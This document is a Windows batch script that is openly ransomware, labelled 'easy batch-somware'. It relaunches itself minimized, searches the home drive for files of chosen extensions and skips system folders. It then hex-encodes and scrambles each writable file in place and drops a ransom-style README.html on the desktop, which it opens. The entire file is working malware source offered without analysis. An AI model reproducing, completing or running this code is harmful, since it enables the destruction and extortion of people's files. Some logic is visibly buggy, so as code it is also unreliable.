@echo off
setlocal enableextensions enabledelayedexpansion
set /a cnt=0
set "fileExtension=*.ext1 *.ext2 *.ext3"

rem "Stealth" startup
IF EXIST "tmp" (del /F /Q tmp  >nul	
	goto x
) ELSE ( ECHO test > tmp
	start /min "" cmd /c "%0"
	exit
)
:x

rem searching in homedrive 
for /r "%homedrive%\" %%i in (*%fileExtension%) do ( set "filePath=%%i"
    set "filePath=!filePath:\=!"
    if /i not "!filePath:windows=!"=="!filePath!" ( echo Skipping Windows directory: !filePath!
    ) else if /i not "!filePath:appdata=!"=="!filePath!" ( echo Skipping AppData directory: !filePath!
    ) else if /i not "!filePath:program files=!"=="!filePath!" (  echo Skipping Program Files directory: !filePath!
    ) else ( echo File found: %%i
		for %%f in ("%%i") do set "fileSize=%%~Zf" >nul
		if !fileSize! equ 0 ( echo skip:       %%i 
		) else ( icacls %filename% | findstr /R ("%username%".*F)
		rem the /C option doesn't work
		if %errorlevel% equ 0 (
			rem the alternative is ("%username%".*M) instead of ("%username%".*F) 
			rem certutil -f -encodehex "%%i" "%%i" 0xC >nul 
			certutil -f -encodehex "%%i" "%%i" 1 >nul 
			call :code "%%i"
			rem echo done2
			
			set /a cnt+=1
		) else ( echo no access to "%%i" )
		)
    )
)
rem message AV alerts here
if %cnt% NEQ 0 ( echo %cnt% files have been encrypted, starting message
	echo ^<html^>^<head^>^<title^>RSM.MSG^</title^> ^<style^> #texto2{padding-top: 2%; letter-spacing: 2px; text-align: center;}^</style^>^</head^> > "%userprofile%\Desktop\README.html"
	echo ^<body bgcolor="#FF3333" scroll="no"^> ^<font face="Lucida Console" size="4" color="white"^> ^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
	echo ^<center^>^<p^> - easy batch-somware - ^</p^>^</center^> ^<div id="texto2"^> ^<img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100"^> >> "%userprofile%\Desktop\README.html"
	echo ^<br^>^<br^>^<br^> Oh, my. It looks like %cnt% of your files were encrypted!^<br^>^<br^>^<br^> >> "%userprofile%\Desktop\README.html"
	echo Not cool, but you can restore your %fileExtension% using decoder tool ^</body^>^</html^> >> "%userprofile%\Desktop\README.html"
	start "" "%userprofile%\Desktop\README.html"
) else (  echo no files have been encrypted, exiting )
rem pause >nul


:code
set "INTEXTFILE=%1"
set "OUTTEXTFILE=tmp.out"
for /f "delims=" %%A in ('type %INTEXTFILE%') do (
    rem set "string=%%A"
	echo %%A
	call :shuffle %%A "%~nx1"
)
del /F /Q %INTEXTFILE%
rename "%OUTTEXTFILE%" "%~nx1"
echo done
exit /b

:shuffle
set str="%1"
for %%a in (%str%) do set str=%%~a
set newstr=
:Loop
set "first=%str:~0,1%"
set "fourth=%str:~3,1%"
set "str=%str:~1,2%%str:~4%"
set "newstr=%newstr%%first%%fourth%"
if not "%fourth%"=="" goto Loop
set "newstr=%newstr%%str:~1%%str:~0,1%
echo %newstr%
echo %newstr% >> "%OUTTEXTFILE%"
goto :eof